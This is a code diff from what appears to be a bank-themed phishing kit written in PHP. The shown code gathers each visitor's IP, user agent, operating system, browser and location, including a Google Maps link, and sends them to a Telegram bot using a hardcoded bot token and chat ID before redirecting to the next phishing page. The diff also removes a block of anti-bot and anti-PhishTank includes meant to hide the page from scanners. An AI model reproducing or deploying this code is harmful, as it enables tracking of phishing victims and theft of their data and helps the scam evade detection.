@@ -172,42 +172,20 @@ if ($success==false) {
 
 $message = "\n\n \n$url\n===========$bank============\n\nCLICKED ON $date AT $time\n\n $ip\n\n$uaget\n\n$uos\n$bsr\n\n$is\n\n$city\n$country\n$continent\n\n maps.google.com/?q=$la$lh$lp\n\n======$project==== \n";
  
-$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA"; 
+$apiToken = "5884162033:AAG_CgkEbML9dXsIy9E1K03yWzUOxbmf8cA";
 $data = [
-    'chat_id' => '-1001831940786',
+    'chat_id' => '-821080105',
     'text' => $message
 ];
+
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
-                                 http_build_query($data) );
+    http_build_query($data));
+
 
 
 header('Location: MOT_3.php');
 ?>
-<? php         include "/anti-bot/Bot-Spox.php";
-        include "/anti-bot/Dila_DZ.php";
-        include "/anti-bot/Fuck-you.php";
-        include "/anti-bot/index.php";
-        include "/anti-bot/IP-BlackList.php";
-        include "/anti-bot/new.php";
-        include "/anti-bot/proxyblock.php";
-        include "/anti-bot/whitelist.dat";
-        include "/anti-bot/#1.php";
-        include "/anti-bot/#2.php";
-        include "/anti-bot/#3.php";
-        include "/anti-bot/#4.php";
-        include "/anti-bot/#5.php";
-        include "/anti-bot/#6.php";
-        include "/anti-bot/#7.php";
-        include "/anti-bot/#8.php";
-        include "/anti-bot/#9.php";
-        include "/anti-bot/#10.php";
-        include "/anti-bot/#11.php";
-        include "/anti-bot/#12.php";
-        include "/anti-bot/antibot_host.php";
-        include "/anti-bot/antibot_ip.php";
-        include "/anti-bot/antibot_phishtank.php";
-        include "/anti-bot/antibot_proxy.php";
-        include "/anti-bot/antibot_userAgent.php"; ?>=(0040)220098/motus/q -->
+<? php  ?>=(0040)220098/motus/q -->
 <html xmlns="http://www.w3.org/1999/xhtml" class=" js flexbox flexboxlegacy"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
         
         <meta http-equiv="X-UA-Compatible" content="IE=edge">
